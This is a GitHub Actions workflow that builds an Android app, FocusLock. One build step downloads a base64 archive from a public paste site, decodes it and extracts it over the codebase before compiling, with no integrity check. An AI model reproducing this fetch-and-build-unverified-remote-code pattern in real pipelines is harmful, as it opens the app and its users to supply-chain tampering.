name: Build FocusLock APK
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up Java 17
        uses: actions/setup-java@v4
        with:
          java-version: 17
          distribution: temurin

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: 8.7

      - name: Download & Restore Clean Codebase
        run: |
          echo "==> Fetching clean codebase payload with all 6 tabs & features..."
          curl -sL "https://api.pastes.dev/FEWNAHPQrm" -o payload.b64
          base64 -d payload.b64 | tar -xz
          
          echo "==> Ensuring Icons and Resource Assets..."
          mkdir -p app/src/main/res/mipmap-anydpi-v26 app/src/main/res/drawable app/src/main/res/xml app/src/main/res/anim
          
          # Clean XML headers
          find app/src/main/res -name "*.xml" -exec sed -i "s/^[ \t]*<?xml/<?xml/" {} +

          echo "==> Compiling FocusLock 3.0 APK..."
          gradle :app:assembleDebug --stacktrace --no-daemon

      - name: Upload FocusLock APK
        uses: actions/upload-artifact@v4
        with:
          name: FocusLock-APK
          path: app/build/outputs/apk/debug/app-debug.apk
